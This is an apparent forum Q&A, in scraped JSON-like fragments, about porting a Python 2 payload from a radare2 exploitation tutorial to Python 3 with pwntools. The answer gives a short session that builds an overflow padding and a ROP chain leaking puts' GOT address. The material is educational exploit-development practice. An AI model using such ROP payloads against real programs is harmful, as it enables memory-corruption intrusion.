    "content": "On the tutorial by Megabeets, \"A journey into Radare 2 â€“ Part 2: Exploitation\", he shows an example of how to create a payload with Python2\n<pre><code># Initial payload\npayload  =  \"A\"*140 # padding\nropchain =  p32(puts_plt)\nropchain += p32(entry_point)\nropchain += p32(puts_got)\n\npayload = payload + ropchain\n</code></pre>\nHow would that get ported to Python3? <pre><code>p32</code></pre> is a 32bit integer. Python3 uses <pre><code>bytes()</code></pre> instead of strings. What's the right way to do this? \n<pre><code>python3-pwntools</code></pre>'s docs show that there are some payload helpers. But, I couldn't get them to work. Worse yet, those helpers were available in Python2 as well, but not used (not sure why).\nHow would I write Megabeet's example using <pre><code>python3-pwntools</code></pre>?\n",

Anyway, you simply need to tell python to treat your payload as bytes by adding the bytes-literal <pre><code>b</code></pre> before the <pre><code>'A'*140</code></pre>.\n<pre><code>>>> from pwn import *\n>>>\n>>> puts_plt = 0x8048390\n>>> puts_got = 0x804a014\n>>> entry_point = 0x80483d0\n>>>\n>>> payload  =  b'A' * 40   # Only 40 for the example\n>>> ropchain =  p32(puts_plt)\n>>> ropchain += p32(entry_point)\n>>> ropchain += p32(puts_got)\n>>>\n>>> payload = payload + ropchain\n>>>\n>>> print(payload)\nb'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x90\\x83\\x04\\x08\\xd0\\x83\\x04\\x08\\x14\\xa0\\x04\\x08'\n>>>\n</code></pre>\nFor further reading, you can read the String and Bytes literals page in the Python3 documentation.\n",

I wasn't sure if it was as simple as using the bit literals, or if I was supposed to use the payload formatter in pwntools.</span>",
